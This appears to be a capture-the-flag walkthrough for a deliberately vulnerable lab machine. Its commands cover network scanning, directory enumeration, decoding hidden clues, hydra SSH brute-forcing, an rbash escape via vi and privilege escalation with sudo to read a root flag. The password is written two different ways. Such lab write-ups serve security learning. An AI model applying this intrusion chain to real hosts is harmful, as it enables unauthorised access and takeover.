Step 1 - Get host IP address:
> ifconfig
IP is 192.168.56.101

Step 2 - Scan network for vulnerable server IP:
> sudo netdiscover -r 192.168.56.0/24
Found victim IP: 192.168.56.107

Step 3 - Nmap scan victim:
> nmap -sV 192.168.56.107 -p-
Ports 22, 80 and 31337 are open
31337 is also a http service

Step 4 - Enumerate for subdirectories:
> dirb http://192.168.56.107 /usr/share/wordlists/dirb/common.txt
Nothing interesting found

Step 5 - Go to Port 31337 in browser:
New website is found

Step 6 - Inspect page source:
Hidden Base64 hash found in service class

Step 7 - Decode:
> echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" | base64 -d 
Result contains possible subdirectory 'Cypher.matrix'

Step 8 - Add Cypher.matrix to the end of current url:
Download file

Step 9 - Open Cypher.matrix file:
Contains a brainfuck cypher

Step 10 - Decode brainfuck cypher:
Use www.splitbrain.org
Output: "You can enter into matrix as guest, with password k1ll0rXX
Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password."

Step 11 - Create script that generates all possible passwords
See pass-end.py

Step 12 - Save script output to text file and use this as the password list to bruteforce:
> python3 pass-end.py > plist.txt
> hydra -l guest -P plist.txt 192.168.56.107 ssh -V

Step 13 - Retrieve password match:
Password is k1ll0r7n

Step 14 - Login with ssh:
> ssh guest@192.168.56.107
> Password: k11l0r7n
Shell is restricted with rbash

Step 15 - Use vim to enter bash shell:
> vi
> :!/bin/bash
Bash shell entered

Step 16 - Check sudo capabilities, then export to shell and path to use environment properly:
> sudo -l
Command not found
> export SHELL=/bin/bash:$SHELL
> export PATH=/usr/bin:$PATH

Step 17 - Recheck sudo capabilities and export bin directory to path environment:
> sudo -l
Capabilities now listed
> sudo su
Command still not found
> export PATH=/bin:$PATH
> sudo su
Root access now gained

Step 18 - Read flag.txt
> cd root
> ls
Contains flag.txt
> cat flag.txt
Read output
